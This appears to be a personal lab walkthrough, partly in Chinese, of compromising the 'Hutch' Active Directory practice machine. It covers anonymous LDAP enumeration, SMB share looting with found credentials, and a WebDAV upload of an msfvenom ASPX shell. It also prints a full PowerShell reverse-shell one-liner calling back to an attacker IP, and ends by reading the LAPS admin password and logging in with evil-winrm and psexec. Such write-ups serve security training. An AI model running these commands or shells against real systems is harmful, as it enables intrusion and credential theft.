```SQL
fmcsorley
```

```SQL
CrabSharkJellyfish192
```

[[389]]389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hutch.offsec0., Site: Default-First-Site-Name)

许多 LDAP 服务器，尤其是一些默认配置的服务器，会允许匿名访问。这意味着在不提供任何用户名或密码的情况下，仍然可以通过简单身份验证方式查询某些基本信息。这通常是为了方便目录查询和服务发现，而这些信息可能对系统管理员无害，但在某些情况下，攻击者可以利用这些公开信息进行进一步的渗透。

在 Hutch 案例中，LDAP 服务器很可能允许匿名用户查询基本的目录信息，正因为如此，不需要用户名和密码也能够查询到对象信息。匿名访问通常是只读的，提供有限的信息（如用户列表、组成员身份等），但是这些信息对攻击者来说仍然非常有用。

```SQL
ldapsearch -x -H ldap://$IP -D "DC=hutch,DC=offsec" -W -b "DC=hutch,DC=offsec" "(objectClass=*)" | grep -i password
```

```SQL
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H ldap://$IP "(objectclass=*)"  >> ldap

ldapsearch -v -x -b "DC=hutch,DC=offsec" -H ldap://$IP "(objectclass=*)" 
```

- `**ldapsearch**`: This is a command-line utility used to query an LDAP directory for information.
- `**v**`: This enables verbose mode. It provides detailed output about the operation, including the search process, which is helpful for debugging or understanding how the search proceeds.
- `**x**`: This option tells `ldapsearch` to use **simple authentication** instead of SASL (Simple Authentication and Security Layer). Simple authentication uses a basic method like username and password (or anonymous if not specified).
- `**b "DC=hutch,DC=offsec"**`: This defines the **base distinguished name (DN)** for the search. In this case:
    - `DC=hutch` and `DC=offsec` refer to the **domain components** of the directory, essentially specifying the starting point (or root) of the LDAP tree where the search begins.
    - This base DN indicates that you are searching within the domain `hutch.offsec`.
- `**H ldap://$IP**`: This specifies the LDAP **host URI** to connect to. The `$IP` is a variable that holds the IP address of the LDAP server you want to query. For example, if the IP address of the server is `192.168.189.122`, you would replace `$IP` with `192.168.189.122`.
- `**"(objectclass=*)"**`: This is the **filter** for the search. The filter `(objectclass=*)` is a very broad filter that matches **any object class**, effectively retrieving **all entries** in the LDAP directory starting from the base DN you specified (`DC=hutch,DC=offsec`).

  

```SQL
grep -i "password" ldap
```

for share in SYSVOL NETLOGON; do smbclient [//192.168.189.122/$share](https://192.168.189.122/$share) -U 'fmcsorley%CrabSharkJellyfish192' -c 'prompt OFF;recurse ON;mget *'; done

  

```SQL
smbclient ////$IP/ -U 'fmcsorley%CrabSharkJellyfish192' -c 'prompt OFF;recurse ON;mget *'
```

  

we can try Cadaver, because:

80/tcp open http Microsoft IIS httpd 10.0  
| http-webdav-scan:  
| Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK  
| Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK  
| Server Type: Microsoft-IIS/10.0  
| Server Date: Fri, 20 Sep 2024 04:38:32 GMT  
|_ WebDAV type: Unknown  
|_http-server-header: Microsoft-IIS/10.0_  
_| http-methods:_  
_|_ Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT

The default directory for Internet Information Services (IIS) on a Windows server is typically the **Inetpub** folder. [This folder is usually located at](https://stackify.com/what-is-inetpub/) `**[C:\inetpub](https://stackify.com/what-is-inetpub/)**`[1](https://stackify.com/what-is-inetpub/). Within this directory, the **wwwroot** subfolder is where the default website files are stored.

  

```SQL
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.157',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```SQL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LIP  LPORT=593  --platform Windows -a x64 -f aspx -o shell.aspx
```

```SQL
curl http://$IP/shell.aspx
```

In this case, I see a folder called **LAPS**, which likely refers to **Local Administrator Password Solution** (LAPS), a Microsoft tool used for managing local administrator passwords securely.

- **LAPS (Local Administrator Password Solution)**:  
    LAPS is a Microsoft tool designed to manage local administrator passwords for domain-joined computers. It periodically changes the local admin passwords and stores them in the **ms-MCS-AdmPwd** attribute within the computer's AD object.
- **Misconfigured Active Directory Permissions**:
    - **ms-MCS-AdmPwd** is a sensitive attribute, and it is essential that access to it is restricted to a few highly privileged users, such as domain administrators.
    - In this case, it seems that the user `**fmcsorley**` has permission to read this attribute, even though they might not have sufficient privileges to be trusted with sensitive information like admin passwords. This is likely due to improper configuration of Active Directory's **Access Control Lists (ACLs)**.
- **Insecure ACL Configuration**:
    - **Access Control Entries (ACEs)** within AD determine which users or groups can read specific attributes, such as **ms-MCS-AdmPwd**.
    - If AD permissions are misconfigured, regular users or non-admin accounts may be able to read sensitive attributes, such as the local admin password stored by LAPS. This misconfiguration is a common issue in environments where least privilege principles are not enforced.

```SQL
ldapsearch -x -H "ldap://$IP"  -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(
ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```

after get pw, ca try

  

```SQL
evil-winrm -i $IP -u Administrator -p '8v@][\#XH{Y.H6{'

```

```SQL
python3 /usr/local/bin/psexec.py hutch.offsec/administrator:'8v@][\#XH{Y.H6{'@$IP
```

```SQL
smbclient //$IP/C$ -U Administrator

more proof.txt
```